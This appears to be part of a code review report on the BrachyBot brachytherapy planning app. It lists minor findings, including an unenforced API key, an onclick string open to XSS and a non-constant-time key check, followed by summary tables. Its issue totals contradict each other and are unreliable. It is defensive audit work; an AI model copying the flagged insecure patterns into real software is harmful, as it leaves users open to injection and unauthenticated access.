logger.warning(f"CTV/OAR array shape mismatch ({ctv_arr.shape} vs {existing_arr.shape}); skipping merge")

# response_tools.py:?
logger.info(f"Tool {tool_name} result: {result}")
```

**Impact:** F-strings in logger calls are always evaluated even when the log level is disabled. For example, `logger.debug(f"Large array: {data}")` always formats the string even if debug level is off. With large numpy arrays, this is a significant performance cost.

**Fix:** Use lazy `%s` formatting:
```python
logger.warning("CTV/OAR array shape mismatch (%s vs %s); skipping merge", ctv_arr.shape, existing_arr.shape)
```

---

## M3. `/api/planning/seeds_3d` route in `viewer_routes.py`

**File:** `web/routes/viewer_routes.py:1044`
**Issue:** The route `/api/planning/seeds_3d` lives in `viewer_routes.py`, not `planning_routes.py`. This is the same grouping as the original monolith, so it's not a regression, but the name `seeds_3d` is planning-related while its file is viewer-related.
**Fix:** Either rename to `/api/viewer/seeds_3d` or move to `planning_routes.py`.

---

## M4. 261 inline `style=""` attributes in `index.html`

**File:** `web/app/index.html`
**Issue:** The CSS split extracted `<style>` blocks into 4 CSS files, but element-level styling is still inlined. For example, every drag handle has:
```html
<div class="..." style="cursor:col-resize;pointer-events:auto !important;isolation:isolate;transform:translateZ(0);">
```
**Impact:** Makes the HTML harder to read, maintains, and change. Inline styles cannot be overridden by user themes without `!important`.
**Fix:** Extract into CSS classes.

---

## M5. `.data-tree-*` styles in `report-controls.css`

**File:** `web/app/static/css/brachybot-report-controls.css:1-20`
**Issue:** `.data-tree-container`, `.data-tree-item`, `.data-tree-toggle`, `.data-tree-label` styles define the data tree appearance but are placed in the report controls CSS file instead of `brachybot-panels-viewers.css` where the data tree HTML lives.
**Fix:** Move to `brachybot-panels-viewers.css`.

---

## M6. No `{CT,MR,US}_DATA_ROOTS` env var documentation

**File:** `web/server_support.py` — `_validate_path` uses `BRACHYBOT_CT_DATA_ROOTS`, `BRACHYBOT_MR_DATA_ROOTS`, `BRACHYBOT_US_DATA_ROOTS` environment variables to expand allowed read paths. These are not documented in any README or startup guide.
**Fix:** Add to README or startup documentation.

---

## M7. `_global_agent` singleton overwritten by multiple instances

**File:** `AgenticSys.py:92-98`
**Issue:** The module-level singleton `_global_agent` is set by every `BrachyAgent` instance, with the last one winning. In multi-session deployments, tools like `planning_pipeline.py` that read `AgenticSys._global_agent` get the wrong session's agent. This is documented in the code as intentional but is fragile.
**Fix:** Use dependency injection instead of a global singleton.

---

## M8. `_clean_response_text` — 27 stacked `re.sub` calls

**File:** `agent_runtime/llm_runtime.py:759-885`
**Issue:** 27 sequential `re.sub` calls, many of which overlap. O(n*m) processing of every LLM response. Maintenance hazard (see H12 for specific bugs).
**Fix:** Consolidate into ~10 focused patterns.

---

## M9. Auto-generated API key never used

**File:** `web/server_support.py:56-59`
**Issue:** When `BRACHYBOT_API_KEY` is unset and `BRACHYBOT_TRUST_NETWORK` is unset, `API_KEY` is set to `secrets.token_urlsafe(32)`, but `_API_KEY_REQUIRED` stays `False`. The generated key is never used — the auth decorator always short-circuits to `True`.
**Fix:** Either generate and enforce the key, or don't generate it.

---

## M10. JSON parse fragility from single-quote replacement

**File:** `agent_runtime/chat_workflows.py:73`
Same issue as H11 but noted again as the mechanism is fragile beyond the apostrophe case. The `replace("'", '"')` approach should be replaced with `ast.literal_eval`.

---

## M11. No retry on LLM API failure

**File:** `agent_runtime/llm_runtime.py:351-355`
**Issue:** Both streaming and non-streaming paths catch `Exception` from the LLM API call and immediately return/die. No exponential backoff, no retry. A transient network error (DNS, TLS renegotiation, server-side throttling) ends the user's session.
**Fix:** Add retry with exponential backoff (3 attempts, 1s/2s/4s delay).

---

## M12. `AgentMemory.clear_conversation()` has dead code for `exp_memory`

**File:** `agent_runtime/core.py:496-498`
**Issue:**
```python
if hasattr(self, 'exp_memory') and self.exp_memory:
    self.exp_memory.clear()
```
`AgentMemory` never sets `self.exp_memory` — it's on `BrachyAgent`. This condition is always `False` when called on `AgentMemory`. Dead code.
**Fix:** Remove.

---

## M13. `agent_runtime/__init__.py` doesn't export mixin classes

**File:** `agent_runtime/__init__.py:1-5`
**Issue:** Only exports `AgentMemory`, `PlanningPhase`, `ToolRegistry`, `ToolResultPipeline` from `core.py`. Does not export `ResponseToolMixin`, `LLMRuntimeMixin`, `ChatWorkflowMixin` from the other modules. These are imported directly by `AgenticSys.py` via the full module path, so it works, but the package's public API is incomplete.
**Fix:** Add mixin classes to `__all__`.

---

## M14. `_todoI18n` referenced in `chat-core.js` before definition in `chat-todo.js`

**File:** `web/app/static/js/brachybot-chat-core.js:1814`
**Issue:** `_todoI18n()` is called in `updateToolProgress` (defined in `chat-core.js`) but `_todoI18n` is only defined in `chat-todo.js:25`. The script load order (chat-core → chat-todo) means the function doesn't exist when `chat-core.js` parses. However, `updateToolProgress` is only called at runtime (not parse time), and by then `chat-todo.js` has loaded. The `try/catch` around the call makes this safe but fragile.
**Fix:** Define `_todoI18n` in `chat-core.js` alongside `_footerI18n`, or ensure a default exists.

---

## M15. `_TODO_LABELS` and `GENERIC_TEMPLATES` dead code in `chat-todo.js`

**File:** `web/app/static/js/brachybot-chat-todo.js:29-37, 567-574`
**Issue:** `_TODO_LABELS` (lines 29-37) and `GENERIC_TEMPLATES` (lines 567-574) are defined as module-level constants but are never referenced anywhere. All their logic is handled by `_todoLabelForStep()` and `_planningTemplates()` respectively.
**Fix:** Remove dead code.

---

## M16. No `"use strict"` in 10/11 JS files

**Files:** All `brachybot-*.js` files except `report-shell.js:14`
**Issue:** 10 of 11 split JS files run in sloppy mode. In an 11-file global-scope architecture, accidental assignment to an undeclared variable creates a silent global instead of throwing `ReferenceError`.
**Fix:** Add `"use strict";` at the top of every file.

---

## M17. Infinite `requestAnimationFrame` render loop

**File:** `web/app/static/js/brachybot-3d-manual.js:463-498`
**Issue:** `animate()` calls `requestAnimationFrame(animate)` unconditionally — never stops. Re-renders the scene at 60fps even with zero interaction or mesh changes.
**Fix:** Only run loop when scene has pending updates; stop on idle.

---

## M18. Hardcoded welcome message bypasses i18n toggle

**File:** `web/app/static/js/brachybot-chat-core.js:149,257,1718`
**Issue:**
```javascript
// Line 149
addChat('system', 'Welcome to BrachyBot. Describe your brachytherapy case...');
// Line 1718
text.textContent = 'Thinking';
```
These strings have no `data-i18n-zh`/`data-i18n-en` attributes. When user toggles EN→中, these stay English.
**Fix:** Use `_t()` or i18n-aware mechanism for all user-visible strings.

---

## M19. Three parallel i18n systems coexist

| System | Mechanism | Scope |
|--------|-----------|-------|
| `data-i18n-*` attributes | `applyI18n()` in chat-core.js | HTML static labels |
| `_TODO_I18N` / `_setActiveTodoLang` | chat-core.js:1864, chat-todo.js:1 | Todo dock labels |
| `REPORT_STRINGS` | report-editor.js | Report form labels |

**Fix:** Consolidate into a single system.

---

## M20. No pytest configuration — `pytest-asyncio` not listed

**File:** Project root
**Issue:** No `pytest.ini`, `pyproject.toml`, `setup.cfg`, or `.coveragerc`. `pytest-asyncio` is needed for async tests but not listed in `requirements.txt`.
**Fix:** Add `pytest.ini` with async support and add `pytest-asyncio` to `requirements.txt`.

---

## M21. `websocket_clients` dead variable

**File:** `web/server.py:89-95`
**Issue:** `websocket_clients = []` is defined but never read or written elsewhere.
**Fix:** Remove.

---

## M22. `first_url` dead variable

**File:** `agent_runtime/llm_runtime.py:269,1224`
**Issue:** `first_url = ""` is assigned but never read.
**Fix:** Remove.

---

## M23. `normalize_dose_image` — output range = window range (misleading name)

**File:** `web/server_support.py:600-606`
**Issue:** `normalize_dose_image` is called with `output_min = window_min` and `output_max = window_max`, making it a clamp operation, not a normalization.
**Fix:** Rename to `clamp_dose_image` or document the behavior.

---

## M24. Worktree copies of tests may diverge

**File:** `.claude/worktrees/*/tests/test_brain_system.py`
**Issue:** Each worktree has its own `test_brain_system.py` and `conftest.py`. If divergent, could mask regressions.
**Fix:** Remove stale worktrees or symlink to the canonical test files.

---

## M25. SHA256 of API key used instead of `hmac.compare_digest`

**File:** `web/server_support.py:947-949`
**Issue:** API key comparison uses `hashlib.sha256(key.encode()).hexdigest()` instead of `hmac.compare_digest` directly. Leaks that the stored form is a hex digest.
**Fix:** Use constant-time HMAC comparison.

---

## M26. `_safe()` helper defined inside `api_upload` — redefined per request

**File:** `web/server.py:187-190`
**Issue:** `_safe` function is defined inside the route handler, creating a new function object on every upload request.
**Fix:** Move to module level.

---

## M27. Duplicate key `toolMeasure` in `viewer-layout.js` tooltips

**File:** `web/app/static/js/brachybot-viewer-layout.js:38-39`
**Issue:** `'toolMeasure'` appears twice in the same object literal. The second value overwrites the first (both identical, so no functional impact).
**Fix:** Remove the duplicate line.

---

## M28. `resampleRatio = 0` division risk in `_displayYToVolumeZ`

**File:** `brachybot-viewer-layout.js`
**Issue:** `_displayYToVolumeZ` divides by `resampleRatio` which could theoretically be 0. Currently guarded by `Math.max(spacingZ / spacingY, 0.01)` in `_getMprGeometry`, but the guard is in a different function.
**Fix:** Add defensive `Math.max(ratio, 0.01)` inside `_displayYToVolumeZ` itself.

---

## M29. `sources.badgeHtml` — double-quote injection in onclick

**File:** `web/app/static/js/brachybot-report-shell.js:171`
**Issue:**
```javascript
onclick="Report.sources.resetTo('${(key || '').replace(/'/g, "\\'")}')"
```
Only single quotes are escaped. If `key` contains `"`, it breaks out of the `onclick` HTML attribute. `key` comes from report form field names (hardcoded), so currently safe, but XSS vector if keys become user-controllable.
**Fix:** Also escape `"` and `&`:
```javascript
.replace(/'/g, "\\'").replace(/"/g, "&quot;")
```

---

## M30. `consistencyCheck.compare` — duplicate key in object literal

**File:** `web/app/static/js/brachybot-chat-todo.js:1107-1109`
**Issue:** Duplicate key `name` in an object literal. The second value overwrites the first.
**Fix:** Remove the duplicate.

---

# Summary

| Severity | Count | Key Areas |
|----------|-------|-----------|
| **CRITICAL** | 18 | Missing imports, path traversal, lock-free rate limiter, `str.format()` crash, triple tool storage, `const` SyntaxError, CSS orphans, CSS undefined classes, operator precedence bugs, regex over-matching, template variable not replaced |
| **HIGH** | 22 | Unhandled AttributeError, CSS syntax error, missing cancel check, CT gate inconsistency, bare except, path validation bypass, 413 HTML response, WET constant, missing dependency, stale worktrees, fragile JSON parse, dead regex condition, dual implementations, int16 overflow, O(n) eviction, import in loop, duplicate route, font rendering, dual i18n systems, cache key collision, unlogged 500, None crash |
| **IMPORTANT** | 25 | Wrong memory key, dead parameter, console.log, dead state, wrong tool name, print(), too-narrow check, organ count sort, array leak, forEach null guard, undefined function refs, triplicated auto-OAR, duplicated LLM loops, dead conversion, repetitive pattern, builtins pollution, hardcoded path, lost promise, screenshot race, hardcoded label IDs, sequential HTTP, orphan RLock, overlay mismatch, zero test coverage |
| **MINOR** | 30 | Unused imports, f-string logging, inconsistent naming, inline styles, misplaced CSS, undocumented env vars, singleton fragility, regex churn, dead API key, fragile JSON, no retry, dead code, incomplete package API, cross-file dependency, dead constants, no strict mode, infinite rAF, i18n bypass, triple i18n, no pytest config, dead variables, misleading function name, divergent test copies, SHA256 leak, inner function allocation, duplicate object key, division guard, XSS vector, duplicate key |

---

## Route Count Verification

| Source | Count |
|--------|-------|
| `web/server.py` | 6 |
| `web/routes/planning_routes.py` | 38 |
| `web/routes/viewer_routes.py` | 12 |
| **Total** | **56** ✅ (matches monolith) |

## Static Resource Verification

| Check | Result |
|-------|--------|
| CSS `<link>` refs in index.html | 5 (all exist) |
| JS `<script>` refs in index.html | 21 (all exist) |
| brachybot-*.js refs | 11 (all exist) |
| brachybot-*.css refs | 4 (all exist) |
| **Missing refs** | **0** ✅ |

## Verification Status

| Check | Result |
|-------|--------|
| py_compile (all .py files) | 206/206 ✅ |
| node --check (frontend JS) | All pass ✅ |
| `from web.server_support import *` residual | 0 ✅ |
| Route registration smoke | 56/56 ✅ |
| Static resource refs | 26 refs, 0 missing ✅ |
| Unittest discover | 13 tests, 9 pass, 4 skip (missing SimpleITK) ✅ |

---

*Report updated 2026-07-10. ~145 total issues found across 5 rounds: 18 CRITICAL, 32 HIGH, 44 MEDIUM, 51 LOW.*


---
